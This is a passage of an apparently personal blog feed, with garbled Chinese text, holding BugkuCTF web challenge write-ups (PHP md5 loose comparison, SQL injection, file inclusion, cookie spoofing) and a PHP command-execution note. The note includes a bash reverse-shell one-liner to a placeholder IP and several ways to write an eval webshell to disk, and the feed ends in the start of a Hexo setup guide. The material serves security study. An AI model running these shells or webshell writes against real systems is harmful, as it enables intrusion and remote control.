id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p>å¤‡ä»½ï¼Œå…¸å‹çš„æºç æ³„éœ²<br>ç›´æ¥è®¿é—®index.php.bak<br>ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"å–å¾—flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>md5ç›¸ç­‰ï¼Œå€¼ä¸ç­‰ã€‚ã€‚<br>phpéšå¼è½¬æ¢çš„ç¼ºé™·ï¼ŒPHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0<br>æ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0<br>240610708å’ŒQNKCDZO<br>ä½†è¿˜æ˜¯æœ‰ä¸€ä¸ªå‘str_replaceè¿‡æ»¤äº†key<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO</span><br></pre></td></tr></table></figure></p><p>æˆäº†</p><h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><p>å—¯ï¼Œsqlæ³¨å…¥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure></p><p>ä¸æŠ¥é”™ã€‚<br>unionæŸ¥è¯¢å’Œæ—¶é—´ç›²æ³¨<br>ä¸¢åˆ°sqlmapç›´æ¥è·‘<br><img src="BugkuCTF-chengjidan.png" alt=""></p><h2 id="ç§‹åå±±è€å¸æœº"><a href="#ç§‹åå±±è€å¸æœº" class="headerlink" title="ç§‹åå±±è€å¸æœº"></a>ç§‹åå±±è€å¸æœº</h2><p><img src="BugkuCTF-qiumingshan.png" alt=""><br>å†™ä¸ªå°jioæœ¬å§â€¦.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span></span><br><span class="line">requests = requests.Session()</span><br><span class="line">rs = requests.get(url)</span><br><span class="line">rs = html.fromstring(rs.content)</span><br><span class="line">rs = str(rs.xpath(<span class="string">'//div/text()'</span>))</span><br><span class="line">rs = <span class="built_in">eval</span>(rs[2:-5])</span><br><span class="line">data=&#123;</span><br><span class="line">  <span class="string">'value'</span>: rs</span><br><span class="line">&#125;</span><br><span class="line">rs = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span> rs.content</span><br></pre></td></tr></table></figure></p><p>å¦‚æœå€¼åä¸å¯¹ä¼šæç¤ºç”¨value:Give me value post aboutâ€¦.</p><p>åŸæ¥ä½ ä¹Ÿæ˜¯è€å¸æœº Bugku{YOU_DID_IT_BY_SECOND}<br>[Finished in 0.9s]</p><h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>hint:æ ¼å¼KEY{xxxxxxxxxxxxxx}<br>æ•°æ®åŒ…é‡Œæœ‰ä¸œè¥¿<br><img src="BugkuCTF-web6.png" alt=""><br>çœ‹ç€åƒbase64ï¼Œè§£ç <br>æŒ‰ç…§æç¤ºPOSTä¸€ä¸ªå‚æ•°margin=WQpzogT0RJek9EVXc=<br>æç¤ºè®©å¿«ç‚¹ï¼Œè„šæœ¬ä¾å€™ï¼Œä¸è¡ŒåŠ ä¸ªè§£ç <br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">rs = session.get(url).headers[<span class="string">'flag'</span>]</span><br><span class="line">flag = base64.b64decode(base64.b64decode(rs).split(<span class="string">':'</span>)[1])</span><br><span class="line">payload = &#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line">rs = session.post(url,payload)</span><br><span class="line"><span class="built_in">print</span> rs.content</span><br></pre></td></tr></table></figure></p><h2 id="cookiesæ¬ºéª—"><a href="#cookiesæ¬ºéª—" class="headerlink" title="cookiesæ¬ºéª—"></a>cookiesæ¬ºéª—</h2><p>åˆšå¼€å§‹è¿˜ä»¥ä¸ºçœŸæcookie<br>å®é™…ä¸Šæ˜¯æ–‡ä»¶åŒ…å«æ³„æ¼ä¸»é¡µæºç <br>è¯·æ±‚urlå‚æ•°ç»è¿‡base64ç¼–ç ï¼Œè§£ç å‘ç°æ˜¯keys.txt,æŠŠindex.phpç¼–ç ä¸€ä¸‹<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span><br></pre></td></tr></table></figure></p><p>åªæœ‰ä¸€è¡Œï¼Œæ³¨æ„åˆ°lineå‚æ•°<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,20):</span><br><span class="line">  url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span></span><br><span class="line">  rs = requests.get(url)</span><br><span class="line">  <span class="built_in">print</span> rs.text</span><br></pre></td></tr></table></figure></p><p>å¾ªç¯è¯»ä¸€ä¸‹æºç <br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=base64_decode(isset(<span class="variable">$_GET</span>[<span class="string">'filename'</span>])?<span class="variable">$_GET</span>[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"><span class="variable">$line</span>=isset(<span class="variable">$_GET</span>[<span class="string">'line'</span>])?intval(<span class="variable">$_GET</span>[<span class="string">'line'</span>]):0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span> = array(</span><br><span class="line">  <span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line">  <span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$file_list</span>[2]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file</span>, <span class="variable">$file_list</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$fa</span> = file(<span class="variable">$file</span>);</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸‹åå‰¯å…¶å®cookieæ¬ºéª—äº†<br><img src="BugkuCTF-web11.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…ˆæ”¾å‡ºbugkuctfç½‘å€:&lt;a href=&quot;http://ctf.bugku.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;click me&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://t43wiu6.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œé‚£äº›äº‹</title>
    <link href="https://t43wiu6.github.io/2018/09/09/safe-command-exec/"/>
    <id>https://t43wiu6.github.io/2018/09/09/safe-command-exec/</id>
    <published>2018-09-09T12:39:32.000Z</published>
    <updated>2019-10-12T02:41:18.067Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‘½ä»¤æ‰§è¡Œå®šä¹‰"><a href="#å‘½ä»¤æ‰§è¡Œå®šä¹‰" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå®šä¹‰"></a>å‘½ä»¤æ‰§è¡Œå®šä¹‰</h2><p>ä½¿ç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤</p><ul><li>ç»§æ‰¿webæœåŠ¡å™¨æƒé™</li></ul><h2 id="å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°</h2><a id="more"></a><blockquote><ul><li>system(è¿”å›æœ€åä¸€è¡Œ)</li><li>exec</li><li>passthru(è¿”å›æœ€åä¸€è¡Œ)</li><li>shell_exec ä½œç”¨ä¸ <code></code>åå¼•å·ä¸€è‡´</li><li>popen(è¿”å›æ–‡ä»¶æŒ‡é’ˆ)</li><li>proc_open(è¿”å›æ–‡ä»¶æŒ‡é’ˆ)</li><li>pcntl_exec å¤šè¿›ç¨‹å¤„ç†æ‰©å±•,éœ€é¢å¤–å®‰è£… (string $path, array $args, array $envs)</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$w = <span class="string">'whoami'</span>;</span><br><span class="line"></span><br><span class="line">system($w);</span><br><span class="line">passthru($w);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>.<span class="string">'exec:'</span>.exec($w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'shell_exec:'</span>.shell_exec($w).<span class="string">'&lt;br/&gt;'</span>; </span><br><span class="line"><span class="keyword">echo</span> `$w`;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> popen(<span class="string">'whoami'</span>,<span class="string">'r'</span>); <span class="comment">//(cmd,mode[r,w])//è¯»å’Œå†™</span></span><br><span class="line">proc_open(<span class="string">'proc_open:'</span>.$w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">pcntl_exec(<span class="string">'pcntl_exec:'</span>.$w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ‰§è¡Œé˜²å¾¡å‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œé˜²å¾¡å‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œé˜²å¾¡å‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œé˜²å¾¡å‡½æ•°</h2><blockquote><ul><li>escapeshellarg() //è½¬ä¹‰å‚æ•° å°†å¼•å·æ›¿æ¢ä¸ºç©ºæ ¼</li><li>escapeshellcmd() //è¿‡æ»¤æ•´æ¡å‘½ä»¤(winä¸‹åŠ ^ linuxåŠ \)</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'ls '</span>.escapeshellarg(<span class="string">'a"'</span>);</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å­—ç¬¦æœ‰<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %</span><br><span class="line"><span class="string">' " åœ¨ä¸æˆå¯¹æƒ…å†µä¸‹ä¹Ÿè¿‡æ»¤</span></span><br></pre></td></tr></table></figure></p><h2 id="ä»£ç æ‰§è¡Œç›¸å…³å‡½æ•°"><a href="#ä»£ç æ‰§è¡Œç›¸å…³å‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œç›¸å…³å‡½æ•°"></a>ä»£ç æ‰§è¡Œç›¸å…³å‡½æ•°</h2><blockquote><ul><li>eval</li><li>assert</li><li>preg_replace (php&lt;=5.5)</li><li>call_user_func</li><li>call_user_func_array</li><li>array_map</li></ul></blockquote><p>å‰ä¸¤ä¸ªå°±ä¸è¯´äº†ï¼Œä¸€å¥è¯å¸¸è§</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚</span></span><br><span class="line"><span class="comment">//å½“ç¬¬ä¸€ä¸ªå‚æ•°çš„æ­£åˆ™è¡¨è¾¾å¼æœ‰eä¿®æ­£ç¬¦çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œ</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">preg_replace(â€œ/test/eâ€,$_GET[<span class="string">"cmd"</span>],â€jutsttestâ€);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?value=[phpinfo()]</span></span><br><span class="line">preg_replace(<span class="string">'/\[(.*)\]/e'</span>, <span class="string">'strtolower("\\1")'</span>, $_GET[<span class="string">'value'</span>]);</span><br><span class="line"><span class="comment">//strtolower("\\1")å®é™…å°±æ˜¯\1 è€Œ\1åœ¨æ­£åˆ™ä¸­æœ‰è‡ªå·±çš„å«ä¹‰</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>åå‘å¼•ç”¨</strong></p></blockquote><blockquote><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ <strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong> å°†å¯¼è‡´ç›¸å…³ <strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong> ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p></blockquote><blockquote><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">æ·±å…¥ç ”ç©¶preg_replace</a></p><p>æ‰€ä»¥è¿™é‡Œçš„ <strong>\1</strong> å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,å³valueä¸­ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,è¾¾åˆ°ä»£ç æ‰§è¡Œç›®çš„</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- call_user_func()</span><br><span class="line">- call_user_func_array()</span><br><span class="line">- array_map()</span><br><span class="line">    </span><br><span class="line"><span class="comment">//è°ƒç”¨å…¶ä»–å‡½æ•°åŠŸèƒ½</span></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,åé¢çš„å‚æ•°ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">$b = <span class="string">'phpinfo()'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>], $b);</span><br><span class="line"><span class="comment">//å½“?a=evalæ—¶å°±è°ƒç”¨äº†evalå‡½æ•°è€Œphpinfo()ä½œä¸ºå‚æ•°</span></span><br></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ‰§è¡Œå¸¸ç”¨ç¬¦"><a href="#å‘½ä»¤æ‰§è¡Œå¸¸ç”¨ç¬¦" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå¸¸ç”¨ç¬¦"></a>å‘½ä»¤æ‰§è¡Œå¸¸ç”¨ç¬¦</h2><blockquote><ul><li>Windowsæ”¯æŒçš„ç®¡é“ç¬¦<br>| ç›´æ¥æ‰§è¡Œåè¾¹çš„<br>|| å¦‚æœå‰é¢æ‰§è¡Œå‡ºé”™ï¼Œæ‰§è¡Œåè¾¹ï¼Œåªèƒ½ä¸ºå‡<br>&amp; å¦‚æœå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåè¾¹ï¼Œå‰è¾¹å¯çœŸå¯å‡<br>&amp;&amp; å‰è¾¹å‡å‡ºé”™ï¼Œå‰è¾¹åªèƒ½ä¸ºçœŸ</li><li>Linuxæ”¯æŒçš„ç®¡é“ç¬¦<br>; æ‰§è¡Œå®Œå‰è¾¹æ‰§è¡Œåè¾¹<br>| å…ˆæ˜¯åè¾¹è¯­å¥æ‰§è¡Œç»“æœ<br>|| å½“å‰è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œæ‰§è¡Œåè¾¹<br>&amp; å¦‚æœå‰è¾¹ä¸ºå‡ç›´æ¥æ‰§è¡Œåè¾¹ï¼Œå‰é¢å¯çœŸå¯å‡<br>&amp;&amp; å¦‚æœå‰è¾¹ä¸ºå‡å‡ºé”™ï¼Œåªèƒ½ä¸ºçœŸ</li></ul></blockquote><h2 id="å‘½ä»¤æ‰§è¡Œçš„å¥‡æ·«æŠ€å·§"><a href="#å‘½ä»¤æ‰§è¡Œçš„å¥‡æ·«æŠ€å·§" class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„å¥‡æ·«æŠ€å·§"></a>å‘½ä»¤æ‰§è¡Œçš„å¥‡æ·«æŠ€å·§</h2><ul><li>ç»•è¿‡é»‘åå•<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a1;b=s;$a$b</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ— å›æ˜¾ç»•è¿‡æ–¹æ³•"><a href="#æ— å›æ˜¾ç»•è¿‡æ–¹æ³•" class="headerlink" title="æ— å›æ˜¾ç»•è¿‡æ–¹æ³•"></a>æ— å›æ˜¾ç»•è¿‡æ–¹æ³•</h3><ul><li><p>å¼¹shellï¼Œncç›‘å¬åˆ¤æ–­</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br><span class="line">|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨DNSéš§é“<br><a href="https://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ?" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p></li></ul><h3 id="åˆ©ç”¨echoå†™é©¬"><a href="#åˆ©ç”¨echoå†™é©¬" class="headerlink" title="åˆ©ç”¨echoå†™é©¬"></a>åˆ©ç”¨echoå†™é©¬</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php @eval($_GET[1]);?&gt;'</span>&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><p>å¦‚æœé•¿åº¦æœ‰é™åˆ¶å¯ä»¥è¿½åŠ ç»•è¿‡<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php'</span>&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'@eval('</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$_GET['</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'1]);'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'?&gt;'</span>&gt;&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p><p>æˆ–è€…ç”¨åæ–œæ \æ‹¼æ¥<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php @eval(\</span></span><br><span class="line"><span class="string">\$_POST[1]); ?&gt;"</span>\</span><br><span class="line">&gt;&gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨å•å¼•å·çš„æ—¶å€™åæ–œæ ä¼šå†™è¿›è¯­å¥çš„é‡Œé¢ï¼Œæ‰€ä»¥ä½¿ç”¨åŒå¼•å·ï¼Œç„¶ååœ¨$çš„å‰é¢åŠ ä¸€ä¸ªåæ–œæ è½¬ä¹‰</p><h3 id="åˆ©ç”¨lså†™é©¬"><a href="#åˆ©ç”¨lså†™é©¬" class="headerlink" title="åˆ©ç”¨lså†™é©¬"></a>åˆ©ç”¨lså†™é©¬</h3><p>é€šè¿‡ls -tæŒ‰æ—¶é—´æ’åˆ—å†™é©¬<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'?&gt;'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'($_POST[1]);'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'@eval'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'&lt;?php'</span></span><br><span class="line">ls -t &gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‘½ä»¤æ‰§è¡Œå®šä¹‰&quot;&gt;&lt;a href=&quot;#å‘½ä»¤æ‰§è¡Œå®šä¹‰&quot; class=&quot;headerlink&quot; title=&quot;å‘½ä»¤æ‰§è¡Œå®šä¹‰&quot;&gt;&lt;/a&gt;å‘½ä»¤æ‰§è¡Œå®šä¹‰&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»§æ‰¿webæœåŠ¡å™¨æƒé™&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°&quot;&gt;&lt;a href=&quot;#å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°&quot;&gt;&lt;/a&gt;å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°&lt;/h2&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="https://t43wiu6.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Webå®‰å…¨" scheme="https://t43wiu6.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HEXOé…ç½®æ•™ç¨‹(Next.Mistä¸»é¢˜)</title>
    <link href="https://t43wiu6.github.io/2018/07/24/hexo-config/"/>
    <id>https://t43wiu6.github.io/2018/07/24/hexo-config/</id>
    <published>2018-07-24T13:23:04.000Z</published>
    <updated>2019-12-25T01:26:39.580Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/07/24/hexo-config/hexo-config-1.png" alt=""></p><h2 id="Hexoç®€ä»‹"><a href="#Hexoç®€ä»‹" class="headerlink" title="Hexoç®€ä»‹"></a>Hexoç®€ä»‹</h2><a id="more"></a><ul><li>hexo ä¸€ä¸ªå¿«é€Ÿç®€æ´é«˜æ•ˆçš„åšå®¢æ¡†æ¶ï¼Œå…¶åŸºäºNode.jsçš„é™æ€blogç¨‹åº</li><li>ä½œè€…æ˜¯å°æ¹¾çš„<a href="https://github.com/tommy351" target="_blank" rel="noopener">tommy351</a></li><li>ä»€ä¹ˆï¼Ÿä½ é—®æˆ‘ä¸ºä»€ä¹ˆä¸ç”¨Wordpressï¼Ÿä½ çŒœã€‚</li><li>é‡‡ç”¨ç¬¬ä¸€ç§çš„å¼Šç«¯å°±æ˜¯â€Github Pagesâ€ç¦äº†ç™¾åº¦çˆ¬è™«</li><li>å‘µï¼æ‰ä¸å­˜åœ¨å‘¢ã€‚æˆ‘ç­‰å°èŒæ–°æ²¡æœ‰å½±å“çš„ã€‚<br><img src="hexo-config-2.jpg" alt=""></li></ul><h2 id="å¿…è¦å‰æ"><a href="#å¿…è¦å‰æ" class="headerlink" title="å¿…è¦å‰æ"></a>å¿…è¦å‰æ</h2><p>å®‰è£…hexoå‰å¿…é¡»çš„ç¨‹åº</p><ul><li>Node.js</li><li>Git</li></ul><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexoå®˜æ–¹æ–‡æ¡£</a><br><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html" target="_blank" rel="noopener">Nodejså®˜æ–¹æ–‡æ¡£</a><br><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">Nextå®˜æ–¹æ–‡æ¡£</a></p><h2 id="å®‰è£…Nodejs"><a href="#å®‰è£…Nodejs" class="headerlink" title="å®‰è£…Nodejs"></a>å®‰è£…Nodejs</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å®‰è£…nodejs</span></span><br><span class="line">$ sudo git <span class="built_in">clone</span> https://github.com/nodejs/node.git</span><br><span class="line">Cloning into <span class="string">'node'</span>...</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹ç›®å½•æƒé™ï¼š</span></span><br><span class="line">$ sudo chmod -R 755 node</span><br><span 